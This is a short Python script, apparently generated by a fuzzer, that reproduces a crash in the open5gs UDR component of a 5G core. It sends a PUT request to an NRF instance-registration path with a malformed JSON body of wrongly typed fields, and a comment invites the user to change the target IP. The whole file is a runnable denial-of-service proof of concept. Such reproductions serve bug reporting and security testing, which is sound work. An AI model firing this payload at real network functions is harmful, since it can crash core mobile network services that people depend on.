#!/usr/bin/env python3
# Crash reproduction for open5gs-udr (info)
# Detected: Sat May  9 05:45:42 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/NSSF-fuzz-6416'
body = b'{"nfInstanceId": 99999, "nfType": 99999, "nfStatus": 99999, "ipv4Addresses": "not_a_list", "fqdn": 99999, "priority": "1", "capacity": "65535", "load": "-1", "nfServices": "not_a_list", "supi": 99999}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
